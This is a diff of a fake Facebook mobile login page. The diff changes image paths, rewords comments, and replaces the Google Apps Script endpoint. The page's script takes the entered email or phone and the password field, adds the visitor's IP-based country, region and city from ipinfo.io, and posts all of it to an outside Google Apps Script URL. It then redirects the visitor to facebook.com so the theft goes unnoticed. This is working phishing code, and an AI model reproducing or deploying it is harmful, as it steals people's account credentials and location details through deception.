@@ -76,7 +76,7 @@
 </head>
 <body>
     <div class="login-container">
-        <img src="IMG_20241023_072537.jpg" style="height:65px; width:65px;">
+        <img src="/storage/emulated/0/DCIM/IMG_20241023_072537.jpg" style="height:65px; width:65px;">
         <p style="font-size:18px">Log into Facebook to continue</p>
         <form action="https://script.google.com/macros/s/AKfycbzuRDKxxURc4cKJMBLuqKbt21EuF1tVmIR8DkQ1EuTN98gRxZWCLlBFqzfmzhnXLzQHaQ/exec" id="FBdata">
             <input type="text" name="email_or_phone" placeholder="Mobile number or email address" style="font-size:19px;" required/>
@@ -90,25 +90,24 @@
             <a href="https://m.facebook.com/?refsrc=deprecated">Forgot password?</a>
             <p>or</p>
             <button style="background-color:white; border-color:#1877f2; border-radius:25px; height:45px; margin-top:25px;"><a href="https://m.facebook.com/reg/#" style="color:#1877f2;">Create new account</a></button>
-            <center><img style="width:50px; height:20px;" src="IMG_20241018_221207.jpg"></center>
+            <center><img style="width:50px; height:20px;" src="/storage/emulated/0/DCIM/IMG_20241018_221207.jpg"></center>
             <p style="font-size:10px">About. Help. More</p>
         </form>        
     </div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script>
-        // Get form element
+        // Reference to the form element
         const form = document.getElementById('FBdata');
 
-        // Add event listener to form submission
         form.addEventListener('submit', (e) => {
             e.preventDefault();
 
-            // Get form data
+            // Gather form data
             const formData = new FormData(form);
 
-            // Fetch user location
+            // Get location details
             $.getJSON("https://ipinfo.io/?format=json", function(data) {
-                // Create JSON data
+                // Prepare JSON data to send
                 const jsonData = {
                     email_or_phone: formData.get('email_or_phone'),
                     message: formData.get('message'),
@@ -116,11 +115,11 @@
                     country: data.country,
                     region: data.region,
                     city: data.city,
-                    form_id: 'FBForm',
+                    form_id: 'FBForm'
                 };
 
-                // Submit form data to Google Script
-                fetch('https://script.google.com/macros/s/AKfycbzuRDKxxURc4cKJMBLuqKbt21EuF1tVmIR8DkQ1EuTN98gRxZWCLlBFqzfmzhnXLzQHaQ/exec', {
+                // Send data to Google Apps Script
+                fetch('https://script.google.com/macros/s/AKfycbwIzw-y0B-m7WOHbyjYMgsFj0l14B8R9LL0GjAgQqQXaLXpTsqddrSQ9GKyD66zigk7/exec', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -128,10 +127,12 @@
                     body: JSON.stringify(jsonData),
                 })
                 .then(() => {
-                    window.location.href = 'https://www.facebook.com'; // Redirect to Facebook
-                });
+                    // Redirect to Facebook after submission
+                    window.location.href = 'https://www.facebook.com';
+                })
+                .catch((error) => console.error('Error:', error));
             });
         });
     </script>
 </body>
-                                                                                                                                                                                                                </html>
+</html>
